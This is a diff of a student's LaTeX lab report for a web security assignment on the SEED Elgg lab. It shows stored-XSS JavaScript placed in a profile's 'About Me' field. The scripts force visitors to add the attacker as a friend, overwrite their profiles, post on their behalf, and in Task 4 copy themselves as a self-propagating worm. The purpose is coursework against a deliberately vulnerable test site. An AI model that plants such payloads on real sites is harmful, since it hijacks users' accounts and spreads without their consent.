@@ -29,7 +29,11 @@ Computer Security Sessional \\
 \vspace{10mm}
 Assignment 2: Web Security Assignment \\
 \vspace{20mm}
+Name: Mohammad Sadat Hossain \\
+\vspace{5mm}
 Student ID: 1905001 \\
+\vspace{5mm}
+Section: A1 \\
 \vspace{15mm}
 \RaggedRight
 }
@@ -45,7 +49,7 @@ Student ID: 1905001 \\
 \section*{Task 1 : Becoming the Victim’s Friend}
 For making some observation, when Samy added Charlie as a friend, this HTTP request was sent:
 
-\begin{minted}[tabsize=4,breaklines=true,breakanywhere=true,bgcolor=LightGray]{html}
+\begin{minted}[tabsize=4,breaklines=true,breakanywhere=true,bgcolor=LightGray]{http}
 GET /action/friends/add?friend=58&__elgg_ts=1707404893&__elgg_token=G8NTaeQr5EhZLASu-9B7Uw&__elgg_ts=1707404893&__elgg_token=G8NTaeQr5EhZLASu-9B7Uw HTTP/1.1
 Host: www.seed-server.com
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
@@ -58,9 +62,9 @@ Referer: http://www.seed-server.com/profile/charlie
 Cookie: elggperm=zhN3G_BuEwIIEwUIhs_dycdo-ZaH4cXa; Elgg=1sk3memisao6ijsf04asuo8q3s
 \end{minted}
 
-58 seems to be an ID for Charlie, which was confirmed upon seeing this GET request for displaying Charlie's profile picture in his profile page.
+58 seems to be the ID for Charlie, which can be confirmed upon seeing this GET request for displaying Charlie's profile picture in his profile.
 
-\begin{minted}[tabsize=4,breaklines=true,breakanywhere=true,bgcolor=LightGray]{html}
+\begin{minted}[tabsize=4,breaklines=true,breakanywhere=true,bgcolor=LightGray]{http}
 GET /serve-file/e0/l1707401864/di/c0/FtBEVGTljF14vKvA9AJ0YRBl95X_hAHrmnXWZBGJnsg/1/58/profile/58large.jpg HTTP/1.1
 Host: www.seed-server.com
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
@@ -72,7 +76,7 @@ Referer: http://www.seed-server.com/profile/charlie
 Cookie: Elgg=h3bdfki7sh3fb6bi9pk2msv20u
 \end{minted}
 
-We then check Samy's profile and find that his ID is 59. We also want to ensure that Samy does not get vicim of his own attack should he ever visit his own profile. That means, we need to know what the ID of the current session owner is. We find out that this can be known from $elgg.session.user.guid$.
+We then check Samy's profile and find that his ID is 59. We also want to ensure that Samy does not get vicim of his own attack, should he ever visit his own profile. That means, we need to know what the ID of the current session owner is. We find out that this and other relevant information can be known from $elgg.session.user$.
 
      \begin{figure}[H]
          \centering
@@ -86,9 +90,9 @@ We then place the following in Samy's ``About Me'' in ``Edit HTML'' format:
 \begin{minted}[tabsize=4,breaklines=true,breakanywhere=true,bgcolor=LightGray]{html}
 <script type="text/javascript">
     window.onload = function () {
-        var Ajax=null;
+        var Ajax = null;
         var ts = elgg.security.token.__elgg_ts; // Time Stamp
-        var token= elgg.security.token.__elgg_token; // Security Token
+        var token = elgg.security.token.__elgg_token; // Security Token
         var myID = 59; // User ID of the attacker (Samy)
         var userID = elgg.session.user.guid; // ID of the visitor
 
@@ -104,7 +108,7 @@ We then place the following in Samy's ``About Me'' in ``Edit HTML'' format:
         Ajax.setRequestHeader("Host", "www.seed-server.com");
         Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         Ajax.send();
-	}
+    };
 </script>
 \end{minted}
 After this, when Alice visits Samy's profile, the attack is executed with the following request being sent:
@@ -126,9 +130,9 @@ On reload, we can see that, Samy is now Alice's friend.
 
 
 \section*{Task 2 : Modifying the Victim’s Profile}
-Again to get idea about what happens under the hood when a user modifies his/her profile, we modify Samy's profile from Samy's account. We see a POST request being made with these headers.
+Again to get idea about what happens under the hood when a user modifies his/her profile, we modify Samy's profile from Samy's account. We see a POST request being made with these headers:
 
-\begin{minted}[tabsize=4,breaklines=true,breakanywhere=true,bgcolor=LightGray]{html}
+\begin{minted}[tabsize=4,breaklines=true,breakanywhere=true,bgcolor=LightGray]{http}
 POST /action/profile/edit HTTP/1.1
 Host: www.seed-server.com
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
@@ -185,8 +189,8 @@ So, basically content is the concatenated form of all the attributes. We can use
 </script>
 \end{minted}
 
-This yields the expected results.\newline
-But there is a more elegant solution, through Form Data. We end up using that.
+This yields the expected results. However, this looks a bit clumsy.
+There is an elegant solution, by using form data. We end up using that.
 
 \begin{minted}[breakanywhere=true,bgcolor=LightGray,breaklines=true,tabsize=4]{html}
 <script type="text/javascript">
@@ -238,7 +242,7 @@ But there is a more elegant solution, through Form Data. We end up using that.
 
 In both the cases, we place the malicious script in Samy's ``About Me'' section's ``Edit HTML'' format like the previous task.
 
-So, Alice's profile is once again infiltred with the following consequences:
+Alice's profile is once again infiltred with the following consequences:
      \begin{figure}[H]
          \centering
          \includegraphics[width=\textwidth]{Images/ss8.png}
@@ -258,7 +262,7 @@ So, Alice's profile is once again infiltred with the following consequences:
 \section*{Task 3: Posting on the Wire on Behalf of the Victim}
 To get things going, we make a test post from Samy's profile. The following POST request is made:
 
-\begin{minted}[tabsize=4,breaklines=true,breakanywhere=true,bgcolor=LightGray]{html}
+\begin{minted}[tabsize=4,breaklines=true,breakanywhere=true,bgcolor=LightGray]{http}
 POST /action/thewire/add HTTP/1.1
 Host: www.seed-server.com
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
@@ -287,7 +291,7 @@ __elgg_token=un1KjOAjar7PKPaDSDuDfA&__elgg_ts=1707419569&body=Test Post
          \label{fig:ss4}
      \end{figure}
 
-This task is quite similar to the previous one, in fact the request body is way shorter. So, we place this script in the ``About Me'' section once again:
+This task is quite similar to the previous one, in fact the request body is way shorter. We place this script in the ``About Me'' section once again:
 
 \begin{minted}[tabsize=4,breaklines=true,breakanywhere=true,bgcolor=LightGray]{html}
 <script type="text/javascript">
@@ -336,10 +340,10 @@ When Alice visits Samy's profile this time, a post is made from her profile with
 \newpage
 
 \section*{Task 4: Design a Self-Propagating Worm}
-This task is basically a combination of the three previous tasks. So in the malicious script, there should be three parts:
+This task is basically a combination of the three previous tasks. In the malicious script, there should be three parts:
 \begin{itemize}
  \item First part will send a friend request to Samy from the profile of whoever is visiting any profile (except the case of Samy visiting Samy's).
- \item Second part will modify the visitor's profile. However instead of placing any random content in the description part, we will now place this entire malicious script (all the parts of it) there so that it can be self-propagating.
+ \item Second part will be responsible for modifying the visitor's profile. However instead of placing any random content in the description part, we will now place this entire malicious script (all parts of it) there so that it can be self-propagating.
  \item Finally, the third part will make a Wire post containing the visitor's profile link.
 \end{itemize}
 
@@ -363,11 +367,11 @@ The full script is the following:
         var userName = elgg.session.user.username;
         var guid = elgg.session.user.guid;
         var SamyID = 59;
-        if (guid == SamyID) return; // no attack if Samy is the visitor
+        if (guid == SamyID) return; // No attack if Samy is the visitor
         var sendurl = `/action/friends/add?friend=${SamyID}&__elgg_ts=${ts}&__elgg_token=${token}&__elgg_ts=${ts}&__elgg_token=${token}`;
-        //Create and send Ajax request to add friend
+        // Create and send Ajax request to add friend
         var Ajax1 = new XMLHttpRequest();
-        Ajax1.open("GET", sendurl, true); // last boolean value is for asynchronous request making
+        Ajax1.open("GET", sendurl, true); // Last boolean value is for asynchronous request making
         Ajax1.setRequestHeader("Host", "www.seed-server.com");
         Ajax1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         Ajax1.send();
@@ -462,7 +466,15 @@ The conseuquences of this attack are manifold. For example, after Samy added the
          \caption{Charlie's profile gets modified with the worm as well}
          \label{fig:ss14}
      \end{figure}
+ \item As continuation, Charlie's profile link is also posted on the Wire.
+     \begin{figure}[H]
+         \centering
+         \includegraphics[width=\textwidth]{Images/ss15.png}
+         \caption{Charlie's profile link is posted on the Wire}
+         \label{fig:ss15}
+     \end{figure}
 \end{itemize}
-So, the worm is propagating, as expected.
+
+So, the worm is propagating, as we expected it to be.
 
 \end{document}
